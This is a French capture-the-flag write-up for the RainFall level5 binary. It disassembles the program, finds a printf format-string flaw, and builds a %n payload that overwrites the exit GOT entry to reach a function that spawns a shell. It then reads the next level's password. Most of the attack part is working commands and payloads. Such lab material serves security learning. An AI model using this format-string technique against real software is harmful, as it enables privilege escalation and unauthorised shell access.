on a un exécutable `level5` qui lit sur l'entrée standard (encore)

```
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

```
level5@RainFall:~$ ./level5
hey
hey
level5@RainFall:~$ ./level5 salut
hey
hey
```

après quelques check sur gdb on obtient trois fonctions

```
0x08048504 <+0>:     push   %ebp
0x08048505 <+1>:     mov    %esp,%ebp
0x08048507 <+3>:     and    $0xfffffff0,%esp
0x0804850a <+6>:     call   0x80484c2 <n>    // call n()
0x0804850f <+11>:    leave
0x08048510 <+12>:    ret
```

```
0x080484c2 <+0>:     push   %ebp
0x080484c3 <+1>:     mov    %esp,%ebp
0x080484c5 <+3>:     sub    $0x218,%esp
0x080484cb <+9>:     mov    0x8049848,%eax         // eax = stdin
0x080484d0 <+14>:    mov    %eax,0x8(%esp)         // argument 3 for fgets()
0x080484d4 <+18>:    movl   $0x200,0x4(%esp)       // argument 2 for fgets()
0x080484dc <+26>:    lea    -0x208(%ebp),%eax
0x080484e2 <+32>:    mov    %eax,(%esp)            // argument 1 for fgets()
0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>  // call fgets()
0x080484ea <+40>:    lea    -0x208(%ebp),%eax
0x080484f0 <+46>:    mov    %eax,(%esp)            // argument for printf()
0x080484f3 <+49>:    call   0x8048380 <printf@plt> // call printf()
0x080484f8 <+54>:    movl   $0x1,(%esp)            // argument for exit()
0x080484ff <+61>:    call   0x80483d0 <exit@plt>   // call exit()
```

```
0x080484a4 <+0>:     push   %ebp
0x080484a5 <+1>:     mov    %esp,%ebp
0x080484a7 <+3>:     sub    $0x18,%esp
0x080484aa <+6>:     movl   $0x80485f0,(%esp)      // argument for system()
0x080484b1 <+13>:    call   0x80483b0 <system@plt> // call system()
0x080484b6 <+18>:    movl   $0x1,(%esp)            // argument for _exit()
0x080484bd <+25>:    call   0x8048390 <_exit@plt>  // call _exit()
```

et on voit un printf vulnérable dans la fonction `n`, grace à une "format string attack" on peut l'utiliser pour appeler la fonction `o` qui lance un shell

pour cela il nous faut l'adresse de `o` :

```
(gdb) info functions
0x080484a4  o
```

et l'adresse de `exit` :

```
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
0x080483d0 <+0>:     jmp    *0x8049838
0x080483d6 <+6>:     push   $0x28
0x080483db <+11>:    jmp    0x8048370
```

on envoie l'adresse de `exit` au format little-endian pour qu'elle soit dans la stack lors de l'appel de printf

```
level5@RainFall:~$ echo -e "\x38\x98\x04\x08 %08x %08x %08x %08x %08x %08x" > /tmp/stringexploit
level5@RainFall:~$ cat /tmp/stringexploit | ./level5
8 00000200 b7fd1ac0 b7ff37d0 08049838 38302520 30252078
```

l'adresse de `exit` est en 4ème position (oui encore)

on ajoute ensuite l'adresse de `o` en decimal; 134513828 - 4 (\x38\x98\x04\x08 = 4 octets), et on utilise le spécificateur `%n` avec l'option `4$` pour que la modification s'applique sur la 4ème position :

```
level5@RainFall:~$ echo -e "\x38\x98\x04\x08%134513824x"'%4$n' > /tmp/stringexploit
```

```
level5@RainFall:~$ (cat /tmp/stringexploit ; cat) | ./level5

...

pwd
/home/user/level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
